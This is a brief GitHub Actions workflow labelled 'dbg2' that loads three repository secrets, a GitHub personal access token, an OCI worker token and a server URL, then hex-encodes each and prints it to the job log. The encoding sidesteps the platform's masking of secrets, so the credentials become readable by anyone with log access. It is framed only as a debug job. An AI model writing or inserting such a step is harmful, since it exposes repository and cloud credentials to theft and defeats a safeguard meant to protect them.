name: dbg2
on: workflow_dispatch
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "A:$(printf '%s' "$GH_PAT" | od -An -tx1 | tr -d ' \n')"
          echo "B:$(printf '%s' "$OCI_WORKER_TOKEN" | od -An -tx1 | tr -d ' \n')"
          echo "C:$(printf '%s' "$OCI_SERVER_URL" | od -An -tx1 | tr -d ' \n')"
        env:
          GH_PAT: ${{ secrets.GH_PAT }}
          OCI_WORKER_TOKEN: ${{ secrets.OCI_WORKER_TOKEN }}
          OCI_SERVER_URL: ${{ secrets.OCI_SERVER_URL }}
